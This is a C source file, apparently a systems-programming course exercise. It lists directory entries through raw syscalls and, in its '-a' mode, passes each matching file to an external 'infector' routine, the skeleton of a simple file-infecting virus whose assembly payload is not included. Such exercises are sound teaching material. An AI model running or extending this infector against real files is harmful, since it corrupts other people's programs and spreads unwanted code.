#include "util.h"
#include <dirent.h>
#define STDIN 0
#define SYS_EXIT 1
#define STDOUT 1
#define STDERR 2
#define SYS_READ 3
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define DT_REG 8
#define SYS_LSEEK 19
#define SYS_GETDENTS 141
extern int system_call();
extern void infection();
extern void infector(char* fileName);
extern void code_start();
extern void code_end();
void printInt(int printMe,int isDebugModeOn);
void printSystemCallDebugMode(int returnCode,int mode,int debugMode,char* ch,int filterd);
typedef struct ent
{
  int inode;
  int offset;
  short len;
  char buf[];
}ent;
int main (int argc , char* argv[], char* envp[])
{
  char buffer[8192];
  int fd;
  int count;
  int i ,isSmodeIsOn=0,isAmodeIsOn=0,isDebugModeOn=0,returCode;
  char sModeChar;
  char d_type,lastFileNameChar;
  ent* e1;
  for(i=1 ; i<argc ; i++){
    if(strcmp(argv[i],"-s")==0){
      isSmodeIsOn=1;
      i++;
      if(i>=argc){
        system_call(SYS_WRITE , STDERR , "Error .\\flame2 -s [CHAR]" , 24); 
        system_call(SYS_WRITE , STDERR , "\n" , 1);
        system_call(1,0x55);
      }
      sModeChar = argv[i][0];
    }
    else if(strcmp(argv[i],"-a")==0){
      isAmodeIsOn = 1;
      i++;
      if(i>=argc){
        system_call(SYS_WRITE , STDERR , "Error .\\flame2 -a [CHAR]" , 24); 
        system_call(SYS_WRITE , STDERR , "\n" , 1);
        system_call(1,0x55);
      }
      sModeChar = argv[i][0];
    }
    if(strcmp(argv[i],"-d")==0)
      isDebugModeOn=1;
  }
  fd = system_call(SYS_OPEN, "." ,0 ,0);
  printSystemCallDebugMode(fd,SYS_OPEN,isDebugModeOn,0,0);

  count = system_call(SYS_GETDENTS ,fd ,buffer,8192);
  printSystemCallDebugMode(count,SYS_GETDENTS,isDebugModeOn,0,0);

  printInt((int)code_start,isDebugModeOn);
  printInt((int)code_end,isDebugModeOn);
  printInt((int)code_end-(int)code_start,isDebugModeOn);

  for(i = 0 ; i<count;){
    e1 = (ent*)(i+buffer);
    d_type = *(buffer+i+ e1->len -1);
    lastFileNameChar = *(buffer+i+ e1->len -3);
    if((isSmodeIsOn || isAmodeIsOn) && d_type==DT_REG){
      if(lastFileNameChar==sModeChar){
        returCode = system_call(SYS_WRITE ,STDOUT ,e1->buf ,strlen(e1->buf));
        printSystemCallDebugMode(returCode,SYS_WRITE,isDebugModeOn,0,0);
        returCode=system_call(SYS_WRITE ,STDOUT ,"\n" ,1);
        printSystemCallDebugMode(returCode,SYS_WRITE,isDebugModeOn,0,0);
        if(isAmodeIsOn){
          infector(e1->buf);
        }
      }
    }
    else if(!isSmodeIsOn&&!isAmodeIsOn){
        returCode = system_call(SYS_WRITE ,STDOUT ,e1->buf ,strlen(e1->buf));
        printSystemCallDebugMode(returCode,SYS_WRITE,isDebugModeOn,0,0);
        returCode=system_call(SYS_WRITE ,STDOUT ,"\n" ,1);
        printSystemCallDebugMode(returCode,SYS_WRITE,isDebugModeOn,0,0);
    }
    i+=e1->len;
  }
    returCode=system_call(SYS_CLOSE , fd ,0,0);  
    printSystemCallDebugMode(returCode,SYS_CLOSE,isDebugModeOn,0,0);
  return 0;
}
void printSystemCallDebugMode(int returnCode,int mode,int debugMode,char* ch,int filterd){
  if(debugMode){
        char* str;
        system_call(SYS_WRITE , STDERR , "\t\t*System Call Mode: " , 20); 
        str = itoa(mode);
        system_call(SYS_WRITE , STDERR , str , strlen(str));    
        system_call(SYS_WRITE , STDERR , " return:" , 8);   
        str = itoa(returnCode); 
        system_call(SYS_WRITE , STDERR , str , strlen(str));   
        if(mode==STDIN){
          system_call(SYS_WRITE , STDERR , " -Input Read: '" , 15); 
          if(*ch=='\n')
            system_call(SYS_WRITE , STDERR , "\\n" , 2);
          else
            system_call(SYS_WRITE , STDERR , ch , 1);
          system_call(SYS_WRITE , STDERR , "'" , 1);
          if(filterd){
            system_call(SYS_WRITE , STDERR , " -filterd" , 9); 
          }
        }
        system_call(SYS_WRITE , STDERR , "*\n" , 2);

    }
}
void printInt(int printMe,int isDebugModeOn){
  char* str;

  str = itoa(printMe);
  printMe=system_call(SYS_WRITE , STDERR ,str , strlen(str)); 
  printSystemCallDebugMode(printMe,SYS_WRITE,isDebugModeOn,0,0);
  printMe=system_call(SYS_WRITE , STDERR ,"\n" , 1);
  printSystemCallDebugMode(printMe,SYS_WRITE,isDebugModeOn,0,0);
}
